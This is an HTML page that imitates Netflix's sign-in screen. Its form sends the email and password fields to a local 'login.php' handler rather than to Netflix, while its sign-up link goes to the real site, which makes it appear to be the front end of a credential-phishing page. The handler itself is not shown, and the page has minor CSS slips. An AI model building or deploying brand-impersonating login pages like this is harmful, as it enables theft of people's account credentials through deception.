<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Sign In</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
        }
        .container {
            width: 100%;
            max-width: 350px;
            margin: 50px auto;
            padding: 20px;
        }
        .logo {
            color: #e50914;
            font-size: 35px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        h2 {
            font-size: 28px;
            margin-bottom: 20px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: none;
            border-radius: 4px;
            background-color: #333;
            color: #fff;
            font-size: 16px;
        }
        .btn {
            width: 100%;
            padding: 12px;
            background-color: #e50914;
            color: #fff;
            border: none;
            font-size: 16px;
            margin-top: 15px;
            border-radius: 4px;
            cursor: pointer;
        }
        .-secondary {
            background-color: #333;
            margin-top: 10px;
        }
        .checkbox {
            display: flex;
            align-items: center;
            margin-top: 15px;
        }
        .checkbox input {
            margin-right: 8px;
        }
        .small-link {
            color: #999;
            text-decoration: none;
            font-size: 14px;
        }
        .small-link:hover {
            text-decoration: underline;
        }
        .bottom-text {
            margin-top: 20px;
            font-size: 14px;
        }
        .bottom-text a {
            color: #fff;
            font-weight: bold;
            text-decoration: none;
        }
        .bottom-text a:hover {
            text-decoration: underline;
        }
        .captcha-text {
            margin-top: 20px;
            font-size: 12px;
            color: #999;
        }
        .captcha-text a {
            color: #0071eb;
            text-decoration: none;
        }
        .captcha-text a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">NETFLIX</div>
        <h2>Sign In</h2>
        <form action="login.php" method="post">
            <input type="text" name="email" placeholder="Email or mobile number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
            <button type="button" class="btn btn-secondary">Use a sign-in code</button>
            <div class="checkbox">
                <input type="checkbox" id="remember" name="remember">
                <label for="remember">Remember me</label>
            </div>
            <div style="margin-top: 10px;">
                <a href="#" class="small-link">Forgot password?</a>
            </div>
            <div class="bottom-text">
                New to Netflix? <a href="https://www.netflix.com/cd/login">Sign up now.</a>
            </div>
            <div class="captcha-text">
                This page is protected by Google reCAPTCHA to ensure you're not a bot.
                <br><a href="#">Learn more.</a>
            </div>
        </form>
    </div>
</body>
</html>
